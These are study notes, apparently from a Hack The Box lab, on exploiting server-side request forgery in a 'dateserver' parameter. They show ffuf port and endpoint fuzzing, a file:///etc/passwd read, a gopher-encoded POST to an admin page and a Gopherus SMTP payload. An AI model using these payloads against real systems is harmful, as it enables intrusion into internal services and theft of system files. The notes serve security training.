# Enumerating the System

- fuzz all open ports of the internel server using the ssrf 

```sh
 seq 1 10000 > ports.txt
```

```sh
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

# Accessing Restricted Endpoints

- finding new endpoits on the `dateserver`  :

```sh
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

# Local File Inclusion (LFI)

- achiving `LFI` using the `file:///etc/passwd` functionality

```js
POST /index.php HTTP/1.1
Host: 10.129.201.127
Content-Length: 48
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.129.201.127
Referer: http://10.129.201.127/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

dateserver=file:///etc/passwd&date=2024-01-01
```

# The gopher Protocol

- we are restricted to GET requests as there is no way to send a POST request with the `http://` URL scheme

```js
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

- We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded

```js
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

- final request

```js
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

- thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us

```sh
 python2.7 gopherus.py --exploit smtp
```

# Blind SSRF

-  Identifying Blind SSRF

```sh
Akilesthedark@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

- While we cannot use blind SSRF vulnerabilities to directly exfiltrate data, as we did in the previous sections, we can employ the discussed techniques to enumerate open ports in the local network or enumerate existing files on the filesystem.

